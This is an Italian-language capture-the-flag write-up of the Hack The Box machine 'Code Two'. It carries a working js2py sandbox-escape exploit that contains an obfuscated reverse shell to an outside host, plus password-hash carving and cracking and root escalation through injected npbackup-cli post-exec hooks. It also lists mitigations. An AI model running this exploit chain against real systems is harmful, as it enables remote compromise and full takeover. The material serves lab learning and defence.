```txt
  ______                   __                  ________                        
 /      \                 |  \                |        \                       
|  $$$$$$\  ______    ____| $$  ______         \$$$$$$$$__   __   __   ______  
| $$   \$$ /      \  /      $$ /      \          | $$  |  \ |  \ |  \ /      \ 
| $$      |  $$$$$$\|  $$$$$$$|  $$$$$$\         | $$  | $$ | $$ | $$|  $$$$$$\
| $$   __ | $$  | $$| $$  | $$| $$    $$         | $$  | $$ | $$ | $$| $$  | $$
| $$__/  \| $$__/ $$| $$__| $$| $$$$$$$$         | $$  | $$_/ $$_/ $$| $$__/ $$
 \$$    $$ \$$    $$ \$$    $$ \$$     \         | $$   \$$   $$   $$ \$$    $$
  \$$$$$$   \$$$$$$   \$$$$$$$  \$$$$$$$          \$$    \$$$$$\$$$$   \$$$$$$ 
                                                                               
                                                                               
                                                                               
===============================================================================

----[ 0x00 ]  DISCLAIMER
-------------------------------------------------------------------------------
Questo documento è esclusivamente a scopo educativo in ambiente di laboratorio
(HTB). Non riprodurre tecniche o procedure su sistemi non autorizzati.

----[ 0x01 ]  ABSTRACT
-------------------------------------------------------------------------------
Target:   Code Two (HTB / lab)
Autore:   Francesco Caligiuri
Lingua:   IT

Sommario: partendo da un esecutore JS “sandbox” (porta 8000), viene sfruttata
un’integrazione insicura di js2py per ottenere RCE lato server. Segue raccolta
credenziali e accesso SSH come utente locale. L’elevazione a root avviene
abusando di sudo NOPASSWD su `npbackup-cli`, iniettando comandi di
post-esecuzione nella configurazione del backup per generare una bash SUID.

----[ 0x02 ]  THREAT MODEL & SCOPE
-------------------------------------------------------------------------------
Attore:    Attaccante di rete con accesso al servizio HTTP:8000.
Assunti:   Nessun accesso iniziale SSH; no credenziali note; porte 22/8000 open.
Obiettivo: Ottener root sul sistema target e leggere /root/root.txt.
Esclusioni: Persistence, lateral movement, data exfil oltre la flag.

----[ 0x03 ]  ENUMERAZIONE INIZIALE
-------------------------------------------------------------------------------
Port scan:
    nmap -sS -p- <target> -T5

Risultati rilevanti:
    22/tcp   open  ssh
    8000/tcp open  http

Il servizio su 8000 espone una webapp con endpoint di esecuzione codice JS:
    POST /run_code  { "code": "<javascript>" }

La home consente anche il download dei sorgenti dell’app.

----[ 0x04 ]  ANALISI APPLICAZIONE E SUPERFICIE DI ATTACCO
-------------------------------------------------------------------------------
Nei requirements si osserva: js2py ~ 0.74

Nota tecnica:
js2py “traduce” JS → Python. Se la sandbox non filtra proprietà/dunder pericolose
(p.es. __class__, __base__, __subclasses__), è possibile raggiungere oggetti
Python “interni” e scorrere la gerarchia dei tipi fino a ottenere riferimenti a
primitive pericolose (es. subprocess.Popen). Questo è un classico “sandbox
escape” in contesti JS→Python.

Impatto: se l’app espone js2py senza hardening, l’utente remoto può eseguire
comandi di sistema con i permessi del processo web (RCE).

----[ 0x05 ]  VULNERABILITÀ (ROOT CAUSE)
-------------------------------------------------------------------------------
- La sandbox JS consente l’accesso a metadati di tipo (__class__/__base__).
- Dalla superclasse si enumerano ricorsivamente __subclasses__().
- Tra le subclassi globali, si individua `subprocess.Popen`.
- Invocando Popen con comandi controllati dall’utente ⇒ RCE.

In breve: **exposed Python internals via js2py bridging** + **no property
filtering** ⇒ **escape**.

----[ 0x06 ]  EXPLOIT LOCALE (PoC) — RCE VIA /run_code
-------------------------------------------------------------------------------
Listener attaccante:
    nc -lvnp 4444

Exploit (invio a /run_code):

    import requests, json

    url = "http://code:8000/run_code"

    js_code = r"""
    let cmd = "printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDQvNDQ0NCAwPiYxKSAm|base64 -d|bash";
    let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;
    let obj = a(a(a,"__class__"), "__base__");
    function findpopen(o) {
        let result;
        for (let i in o.__subclasses__()) {
            let item = o.__subclasses__()[i];
            if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                return item;
            }
            if (item.__name__ != "type" && (result = findpopen(item))) {
                return result;
            }
        }
    }
    let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
    console.log(result);
    result;
    """

    r = requests.post(url, data=json.dumps({"code": js_code}),
                      headers={"Content-Type": "application/json"})
    print(r.text)

Perché base64?
- Evita problemi di escaping nella stringa JS/JSON.
- `printf <b64> | base64 -d | bash` ricostruisce:
  `bash >& /dev/tcp/10.10.16.44/4444 0>&1`
    * stdout/stderr → socket TCP verso l’attaccante
    * stdin ← stessa socket (connessione interattiva)

Esito: reverse shell come utente applicativo (es. “app”).

----[ 0x07 ]  POST-EXPLOIT (USER FLAG)
-------------------------------------------------------------------------------
Dalla shell:
    id; hostname
    cd /home/marco
    cat user.txt    # FLAG USER

Raccolta indizi locali:
    find / -maxdepth 3 -name "npbackup.conf" 2>/dev/null
    ls -la /home/marco /home/marco/backups

Si individua `npbackup.conf` e un DB utenti (users.db).

----[ 0x08 ]  CREDENZIALI (CARVING & CRACK)
-------------------------------------------------------------------------------
Se il DB SQLite è integro:
    sqlite3 users.db 'SELECT username, password_hash FROM user;'

Se “malformed”, carving:
    strings -a /tmp/users.db \
      | awk 'match($0,/([A-Za-z0-9._-]{3,})[^0-9a-f]{0,3}([0-9a-f]{32})/,a){print a[1] ":" a[2]}' \
      | sort -u > /tmp/users_for_john.txt

Pulizia eventuale:
    sed -E 's/^M([A-Za-z0-9._-]+):/\1:/' /tmp/users_for_john.txt > /tmp/users_for_john_clean.txt

Crack (MD5 raw):
    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/users_for_john_clean.txt
    john --show /tmp/users_for_john_clean.txt

Esito: password di “marco”.

Login:
    ssh marco@<target>

----[ 0x09 ]  PIVOT PRIVILEGI — SUDOERS
-------------------------------------------------------------------------------
Verifica:
    sudo -l

Output:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli

Interpretazione:
- `marco` può eseguire **come root** `npbackup-cli` **senza password**.
- `npbackup-cli` accetta un file di configurazione arbitrario via `-c`.
- La configurazione supporta hook di esecuzione: `pre_exec_commands` / `post_exec_commands`.

Conclusione:
- Se possiamo fornire **noi** il file di configurazione con un `post_exec_commands`
  malevolo, i comandi verranno eseguiti come root → escalation.

----[ 0x0A ]  ESCALATION: INIEZIONE POST_EXEC_COMMANDS
-------------------------------------------------------------------------------
1) Copia config legit:
    cp /home/marco/npbackup.conf /tmp/root_conf.conf

2) Iniettare hook di post-exec (esempio):
    # Inserire sotto "backup_opts" (rispettare JSON):
    "post_exec_commands": [
        "/bin/bash -c 'cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot'"
    ],
    "post_exec_per_command_timeout": 3600,
    "post_exec_failure_is_fatal": false

3) Trigger:
    sudo /usr/local/bin/npbackup-cli -c /tmp/root_conf.conf --backup

4) Prendere root:
    ls -l /tmp/bashroot     # atteso SUID root
    /tmp/bashroot -p
    whoami                  # root
    cat /root/root.txt      # FLAG ROOT

Perché `bash -p`?
- Preserva l’euid effettivo in SUID mode, evitando il drop dei privilegi.
- Garantisce ambiente e UID/EGID coerenti per comandi successivi.

----[ 0x0B ]  CATENA D’ATTACCO (TIMELINE)
-------------------------------------------------------------------------------
1) Recon:    nmap → porte 22/8000
2) RCE:      Exploit js2py via /run_code → reverse shell “app”
3) Flag usr: /home/marco/user.txt
4) Creds:    carving MD5 → crack → SSH “marco”
5) Sudo:     NOPASSWD su npbackup-cli
6) Root:     iniezione post_exec_commands → bash SUID → root.txt

----[ 0x0C ]  MITIGAZIONI
-------------------------------------------------------------------------------
- Hardening js2py:
  * Bloccare accesso a __class__/__base__/__subclasses__
  * Isolare completamente runtime JS (process sandbox, seccomp, policy SELinux)
  * Validare/filtrare il codice utente o disabilitare l’esecuzione di codice arbitrario
- Sudoers:
  * Rimuovere NOPASSWD per strumenti complessi
- npbackup-cli:
  * Disabilitare/limitare pre/post_exec_commands
  * Validare config provenienti da utenti non trusted

----[ 0x0D ]  IOCs / ARTEFATTI (LAB)
-------------------------------------------------------------------------------
- Reverse shell verso 10.10.16.44:4444
- /tmp/bashroot (SUID)
- /home/marco/npbackup.conf e /tmp/root_conf.conf (manipolato)
- Richieste HTTP POST a /run_code con payload JS anomali

----[ 0x0E ]  APPENDICE TECNICA
-------------------------------------------------------------------------------
Enumerazione subclassi Python da JS:
- Ogni oggetto in js2py può “puntare” alla sua classe Python interna:
  o.__class__ → supertipo → __subclasses__() (ricorsiva)
- Esecuzione comandi: Popen(<cmdline>, ...) → .communicate()

----[ 0x0F ]  SOMMARIO (TL;DR)
-------------------------------------------------------------------------------
- Sandbox JS con js2py non filtrata → RCE via traversal di metaclassi
- Credenziali utente ricavate da DB (o carving) → SSH “marco”
- sudo NOPASSWD su npbackup-cli → post_exec_commands → SUID bash
- Root shell e lettura /root/root.txt

Rooted.

----[ 0x10 ]  RIFERIMENTI & CREDITI
-------------------------------------------------------------------------------
- js2py sandbox-escape patterns (property/dunder traversal)
- Tecniche classiche di PE via hook (pre/post exec) in strumenti di backup
- Autore: Francesco Caligiuri
- Ringraziamenti: @Marven11 per public research su js2py sandbox escape
  (CVE correlata, PoC pubblici e write-up tecnici)

===============================================================================
 .: Knowledge, Skillz, Root :.                      .: Stay curious! :.
===============================================================================
```